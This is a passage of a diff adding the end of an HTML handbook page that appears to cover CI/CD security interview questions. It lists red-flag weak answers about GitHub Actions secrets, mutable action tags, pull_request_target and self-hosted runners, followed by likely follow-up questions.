+        <li>Do you know self-hosted runners aren't ephemeral?</li>
+        <li>Do you treat workflow changes as privilege changes?</li>
+      </ul>
+      <h5>Weak answers</h5>
+      <ul>
+        <li><span class="redflag">Red flag:</span> "we store secrets in GitHub secrets, so it's fine."</li>
+        <li><span class="redflag">Red flag:</span> unaware that action tags are mutable.</li>
+        <li><span class="redflag">Red flag:</span> no distinction between <code>pull_request</code> and
+          <code>pull_request_target</code>.</li>
+      </ul>
+      <div class="followups">
+        <div class="note-title">Likely follow-ups</div>
+        <ul>
+          <li>How do you safely comment on a fork PR from CI?</li>
+          <li>What does artifact attestation give you?</li>
+          <li>How would you configure self-hosted runners safely?</li>
+        </ul>
+      </div>
+    </div>
+  </details>
+
+</article>
+</main>
+</div>
+
+<script src="../assets/nav-data.js"></script>
+<script src="../assets/search-index.js"></script>
+<script src="../assets/handbook.js"></script>
+</body>
+</html>
